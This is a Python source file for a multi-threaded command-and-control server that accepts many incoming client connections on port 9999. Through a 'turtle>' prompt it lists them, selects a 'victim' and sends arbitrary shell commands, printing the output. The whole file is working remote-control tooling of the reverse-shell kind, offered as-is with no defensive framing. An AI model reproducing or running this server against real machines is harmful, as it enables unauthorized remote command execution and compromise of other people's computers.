import socket
import sys
import time
import threading
from queue import Queue

number_of_thread = 2
job_number = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []

#create a socket
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as e:
        print("Socket Creation Error:", str(e))
        sys.exit(1)

#binding the socket and listing for connection
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding For The Port", str(port))
        s.bind((host, port))
        s.listen(5)

    except socket.error as e:
        print("Socket Binding Error:", str(e))
        sys.exit(1)

#Handling the connection from multiple clients and saving to a list
#Closing connection when the fill MultiThreadServer.py is restarted

def accepting_connections():
    for c in all_connections:
        c.close()
    
    del all_connections[:]
    del all_addresses[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1) # Prevent timeout
            all_connections.append(conn)
            all_addresses.append(address)

            print("Connection has been stablished! :", address[0])
        except:
            print("Error accepting connections")


# 2nd thread fonctions: 1) See the clients 2) Select a client 3) Send the commands to the connected clients
# Interactive prompt for sending commands

def start_turtle():
    while True:
        cmd = input("turtle> ")

        if cmd == "list":
            list_connections()

        elif "select" in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)

        else:
            print("Command not recognized")

# Display all current active connections with the client

def list_connections():
    results = ""

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(" "))
            conn.recv(201480)
        except:
             del all_connections[i]
             del all_addresses[i]
             continue
        
        results = str(i) +"    "+ str(all_addresses[i][0]) +"    "+ str(all_addresses[i][1]) + "\n"
    print("--------Client--------\n", results)


# Selecting target
def get_target(cmd):
    try:
        target = cmd.replace("select ", "")  # target = id 
        target = int(target)

        conn = all_connections[target]

        print("You are now connected to: ", str(all_addresses[target][0]))
        print(all_addresses[target][0], ">", end="")

        return conn
    
    except:
        print("Selection not valid")
        return None


# Send command to client/Victim or Friend
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = conn.recv(201480)
                print(client_response.decode("utf-8", errors="ignore"), end="")
        except:
            print("Error Sending Commands")
            break


# Create workers thread
def create_workers():
    for i in range(number_of_thread):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()
    

# Do next job that is queue(handling connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()
        
        queue.task_done()

# Create jobs
def create_jobs():
    for x in job_number:
        queue.put(x)
    queue.join()


create_workers()
create_jobs()